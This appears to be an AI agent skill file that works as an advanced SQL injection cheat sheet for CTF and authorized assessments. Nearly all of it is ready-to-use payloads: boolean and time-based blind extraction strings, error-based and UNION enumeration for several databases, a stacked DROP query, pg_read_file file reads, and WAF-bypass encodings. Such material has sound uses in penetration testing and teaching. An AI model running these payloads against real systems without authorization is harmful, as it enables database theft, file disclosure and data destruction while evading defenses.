name: sqli-advanced
description: Advanced SQL injection — beyond the basic ' OR 1=1. Covers blind (boolean/time-based) extraction, error-based detection, second-order and stacked injection, and per-database enumeration (MySQL/MSSQL/Oracle/PostgreSQL). Use when a query is injectable but the flag/data is NOT reflected directly, or when classic auth-bypass payloads are WAF-blocked.
---

# Advanced SQL Injection

Authorized CTF/assessment use. The flag is usually a value you must EXTRACT from the DB, not a login bypass. When the result isn't reflected, go blind. The loop: confirm injection → identify DB → enumerate (databases → tables → columns → data) → read flag.

## 1. Confirm injection (when no visible error)

- **Error-based:** `'` → syntax error leaks DB type; `' AND 1=CONVERT(int,(SELECT @@version))--` forces version into an error.
- **Boolean blind:** `' AND 1=1--` (normal) vs `' AND 1=2--` (different) → blind confirmed.
- **Time blind:** `' AND SLEEP(5)--` (MySQL) / `'; WAITFOR DELAY '0:0:5'--` (MSSQL) / `'||pg_sleep(5)--` (Postgres) → delay = confirmed.

## 2. Blind extraction (the workhorse)

**Boolean (substring, one char at a time):**
```
' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'--     (MySQL)
' AND ASCII(SUBSTRING((SELECT ...),1,1))=97--                        (compare ASCII)
```
**Time-based (binary-search the char):**
```
' AND IF(ASCII(SUBSTRING((SELECT ...),1,1))>109,SLEEP(3),0)--       (MySQL)
```
Loop: length first (`LENGTH(...)`), then each char via substring/ascii. Automate with sqlmap (`--dump`) when manual is too slow.

## 3. Injection contexts (don't miss these)

- **Second-order:** payload stored now, executed later (register a username with a quote → later query on that username triggers it).
- **Stacked queries:** `'; DROP...;--` when the driver allows multiple statements (MSSQL/PG often do; MySQL via `mysqli_multi_query`).
- **ORDER BY / LIMIT / GROUP BY** positions — often injectable but only for blind/error, not union.
- **UNION:** determine column count (`ORDER BY n` until error), match types, then `UNION SELECT 1,2,...,flag_col FROM table`.

## 4. Per-database enumeration (shortest path to the flag)

**MySQL:**
```
SELECT @@version, user(), database()
information_schema.tables → information_schema.columns
' UNION SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
```
**MSSQL:**
```
SELECT @@version; DB_NAME(); IS_SRVROLEMEMBER('sysadmin')   (SA check)
master.dbo.sysdatabases / 库名.dbo.sysobjects (xtype='U') / syscolumns
```
**PostgreSQL:**
```
SELECT version(), current_database(), current_user
information_schema.tables / columns; pg_read_file('/flag',0,100) if superuser
```
**Oracle:**
```
SELECT banner FROM v$version; all_tables / all_tab_columns
```
**SQLite:** `sqlite_master` (`SELECT group_concat(sql) FROM sqlite_master`).

## 5. WAF bypass (when payloads are blocked)

```
space    → /**/  or +  or %09
keywords → SeLeCt (case), /*!union*/ (MySQL inline comment)
'        → %27, double-quote, CHR()/CHAR() concat
=        → LIKE, IN, BETWEEN
'-- '    → '-- -', '#' (MySQL), ';--' (MSSQL)
```

## Cross-cutting
- **The goal is extraction, not bypass** — after login bypass, go enumerate and dump the flag column.
- **Blind = slow but always works** — substring + ascii + time is the universal fallback when union/error are blocked.
- Self-verify: the extracted value should be self-consistent (read the same column twice) before trusting it.
